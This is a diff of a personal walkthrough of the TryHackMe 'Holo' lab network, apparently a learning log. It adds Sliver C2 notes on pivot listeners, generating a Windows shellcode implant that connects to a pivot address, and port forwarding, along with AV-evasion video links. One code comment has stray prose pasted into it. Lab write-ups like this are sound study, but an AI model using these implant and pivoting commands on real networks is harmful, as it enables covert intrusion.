@@ -29,10 +29,13 @@ Returning to this after lots of Hack the Box I decided to follow along with [Alh
 Tasks 0 - 21 [Part 1 Alh4zr3d](https://www.youtube.com/watch?v=PqnnKMU3XMk)
 Task 22 -  [Part 2 from 1:53:00 Alh4zr3d](https://www.youtube.com/watch?v=-a10dxWbp5M) - 
 
-
+Part 1 - [CTHULHU CHURSDAY - Hacking into TryHackMe's "Holo" Network!](https://www.youtube.com/watch?v=-a10dxWbp5M)
+Part 2 - [Customizing Empire for Antivirus Evasion, and Demonstrating Post-Exploitation on TryHackMe's Holo!](https://www.youtube.com/watch?v=tJGROL0PM4I) 
+Part 3 - [THM Alh4zr3d  Owning THM Holo Network](https://www.youtube.com/watch?v=UCBcpgdKPak)
+Part 4 - [THM Cthulhu Cthursday: The Malding Conclusion of TryHackMe's "Holo"!](https://www.youtube.com/watch?v=0VGRim39U9w)
 ## Initial Recon
 
-The inital nmap:
+The initial nmap:
 ![initnmap](init-recon-nmap-webserver.png)
 
 ![nikto](nikto-init-webserver.png)
@@ -382,14 +385,6 @@ I wondered what was going on, I cant get execution but AV is actually removing i
 
 ## 2024 Return to complete
 
-[2:57:02](https://www.youtube.com/watch?v=-a10dxWbp5M)
-
-https://www.youtube.com/watch?v=UCBcpgdKPak
-
-https://www.youtube.com/watch?v=0VGRim39U9w
-
-
-
 Found this nice database dumping script, has to run as root
 ```bash
 #!/bin/bash
@@ -415,8 +410,77 @@ Plan is to go full Sliver and `portfwd`  through to and hopeful very AV evasive 
 f2dd18883b602e08e91fabbe60ac242e6e98a3065479bc14b39a48e63b302ec8f0179fda42d01272396f1e70b78e5700a9e7
 ```
 
+Apparent Rock, now ASHAMED_BARBITURATE for more amazing Sliver names.. [Wikipedia - https://en.wikipedia.org/wiki/Barbiturate Truth serum is bullshit generator](https://en.wikipedia.org/wiki/Barbiturate). *The memory-impairing effects and cognitive impairments induced by sodium thiopental are thought to reduce a subject's ability to invent and remember lies. This practice is no longer considered legally admissible in court, owing to findings that subjects undergoing such interrogations may form false memories, putting the reliability of all information obtained through such methods into question.* It was a simpler time with simpler minds still apparently... Any way the truth is something you have to work for like anything else there is trying hard and smartly trying. Looking forward to the next Windows beacon name. I do not think you I can get this level of fun information through Video Games as good a Baldur Gate 3 absolutely is.. someone will probably make an amazing mod for it like a expansion like how DOS2 tried to get people to DM the Game not sure whether it worked. Old day when I am on a Ring World maybe I will get to have friends and family and play games like that together when I have time - I forgot what barbiturates were. Waiting for cronjobs and compilations and Al to get to the point I am/was at. Anyway knowing how these all situations go. Issues ahoy I know why they go the way they go.
+
+
+Not persistence.. nice `bash`
+![](notpersistence.png)
+Eventually, sloppiness in my secondary shell, which thankfully is run in memory by sliver... but packet economy is packet economy. And my `nohup` does not seem to work on this, but its all part of the situation today at least I learnt to read and learn from the history of this.
+
+
+#### Notes from 
+
+[Customizing Empire for Antivirus Evasion, and Demonstrating Post-Exploitation on TryHackMe's Holo!](https://www.youtube.com/watch?v=tJGROL0PM4I) 
+
+[CTHULHU CHURSDAY - Hacking into TryHackMe's "Holo" Network!](https://www.youtube.com/watch?v=-a10dxWbp5M)
+
+#### Back to Holo in 2024
 
 
 [THM Alh4zr3d  Owning THM Holo Network: 51:11](https://www.youtube.com/watch?v=UCBcpgdKPak)
+
+I am pretty sure that I need I need to have a pivot through LServ1 for my OneDrive -> Cmd.exe looking forward to the awesome name.  
+
+Pivots != `Portfwd`, egress through implants; [Pivoting](https://github.com/BishopFox/sliver/wiki/Pivots) - C2 Traffic
+```go
+// List all an decide
+beacons
+// For each required hop 
+use $implant
+// Requires interactive session
+interactive
+// List pivots
+pivots 
+// For implant that will be the pivot listener  
+use $session-id
+// Open a pivot port
+pivots tcp
+pivots tcp --bind 0.0.0.0
+// get details on a specific pivot listener; graph will display the json with more infowhether it worked. Old day when I am on a Ring World maybe I will get to have friends and famil
+pivots detail | pivot graph
+// Generate a Pivot Implant  that will connect to the pivot listener 
+generate --tcp-pivot 10.10.10.10:6969
+```
+
+Some people get there kicks from power, but for me I exist to slowly and methodically fix and try and try and try, like drowning for dopamine. [Like the monkey](https://www.youtube.com/watch?v=FIxYCDbRGJc), except all the hurdles in my life will vanish in time crystallised into moments like this [hilarious douche](https://www.youtube.com/watch?v=Rr7bf6tIzWs).
+
+```
+pivots tcp --bind 0.0.0.0
+
+generate --tcp-pivot --arch amd64 --os windows --save /tmp/8446-sliver.win -f shellcode -G
+```
+
+
+[Port-Forwarding](https://github.com/BishopFox/sliver/wiki/Port-Forwarding) - Tunneling generic TCP connections
+```go
+// By default all port forwards will be bound to the `127.0.0.1` interface, but you can override this using the `--bind` flag
+// Local port forward
+portfwd add --remote 10.10.10.10:22
+// Reverse Port forward
+rportfwd add --remote 10.10.10.10:22
+// `wg-portfwd` WireGuard Port Foward requires WireGuard 
+```
+
+Unfortunately my attention is required else where for an emergency.
+
+Watch and read the evasion related 
+https://www.youtube.com/watch?v=tJGROL0PM4I 
+
+
+https://www.youtube.com/watch?v=UCBcpgdKPak
+
+
+Reminder that Alh4zr3d will mald into the oblivion to stop at a point where he is trying the NTMLrelay [THM Alh4zr3d  Owning THM Holo Network](https://www.youtube.com/watch?v=UCBcpgdKPak) to then move to [THM Cthulhu Cthursday: The Malding Conclusion of TryHackMe's "Holo"!](https://www.youtube.com/watch?v=0VGRim39U9w)
+
 
 ## Beyond Root
